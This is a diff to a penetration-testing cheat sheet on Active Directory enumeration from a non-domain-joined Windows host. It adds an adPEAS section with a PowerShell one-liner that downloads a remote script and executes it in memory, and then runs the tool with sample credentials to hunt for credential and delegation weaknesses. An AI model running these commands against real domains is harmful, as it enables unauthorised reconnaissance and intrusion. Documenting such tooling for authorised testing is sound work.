@@ -1,7 +1,7 @@
 ## Active Directory Recon
 ## Enumeration from a non-domain joined Windows computer
 #### Note:
-**Login as a local admin user and configure your system DNS server to be the IP address of a domain controller in the target domain firstly.**\
+**Login as a local admin user and configure your system DNS server to be the IP address of a domain controller in the target domain firstly if the DNS is not configured automatically when the IP address is assigned.**\
 `(Control Panel > Network and Internet > Network Connections > Ethernet Properties > IPv4 Properties)`\
 Also, it can be set through the Powershell.
 ```powershell
@@ -105,6 +105,15 @@ C:\> runas /netonly /user:UNSAFE\ruser powershell.exe
 #3. Generate a report from the command line:
  .\ADACLScan.ps1 -Base "DC=unsafe,DC=local" -Scope subtree -Server dc.unsafe.local -Port 389 -Output HTML -Show
  .\ADACLScan.ps1 -Base "DC=unsafe,DC=local" -Scope subtree -Server dc.unsafe.local -Port 389 -EffectiveRightsPrincipal ruser -Output HTML -Show
+```
+<br/>
+
+**adPEAS**
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
+
+#Bloodhound module is excluded
+Invoke-adPEAS -Domain unsafe.local -Username 'unsafe\luser' -Password 'S3cP@ss' -Module Domain,CA,Creds,Delegation,Accounts,Computer -Vulns
 ```
 <br/>
 
@@ -232,4 +241,5 @@ https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html \
 https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html \
 https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc772217(v=ws.11) \
 https://github.com/p0dalirius/LDAPmonitor \
-https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps
+https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps \
+https://github.com/61106960/adPEAS 
